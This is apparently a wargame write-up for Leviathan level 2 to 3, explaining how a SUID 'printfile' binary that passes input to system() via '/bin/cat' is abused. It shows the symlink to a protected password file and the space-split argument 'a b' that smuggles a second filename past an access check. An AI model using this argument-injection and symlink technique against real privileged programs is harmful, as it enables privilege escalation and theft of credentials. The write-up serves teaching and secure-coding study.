# Leviathan Level 2 → 3

## Goal
Analyze the SUID binary `printfile` and exploit its behavior to access the next level password.

## Enumeration

Commands used:

```bash
ls -la
file printfile
ltrace ./printfile
```

## Key Findings

The binary was identified as a SUID executable owned by the next level user.

Using `ltrace`, I observed the following behavior:

```text
access(filename, 4)
snprintf("/bin/cat %s")
system(...)
```

This indicated that:
- the program checks whether a file is readable
- it constructs a command using `/bin/cat`
- the command is executed with `system()`

The use of `system()` suggested possible shell interpretation vulnerabilities.

## Investigation

The binary checked access permissions on the provided argument before executing:

```bash
/bin/cat <user_input>
```

Because the command was passed through the shell, spaces inside the argument were interpreted as separate filenames.

This created an opportunity to bypass the intended access restrictions.

## Exploitation

Inside `/tmp`, I created:

1. A readable file named `a`
2. A symbolic link `b` pointing to the password file for the next level

Commands used:

```bash
mkdir /tmp/levi2-test
cd /tmp/levi2-test

echo test > a
ln -s /etc/leviathan_pass/leviathan3 b
```

Then I executed:

```bash
~/printfile "a b"
```

The program internally executed:

```bash
/bin/cat a b
```

This caused:
- `a` to satisfy the access check
- `b` to be interpreted as a second file argument
- the password file to be read with elevated privileges

## Lessons Learned

- Risks of using `system()` in privileged programs
- Shell argument splitting behavior
- How symbolic links can redirect file access
- Difference between access validation and command execution
- Basic command injection and argument manipulation concepts
- Importance of secure input handling in C programs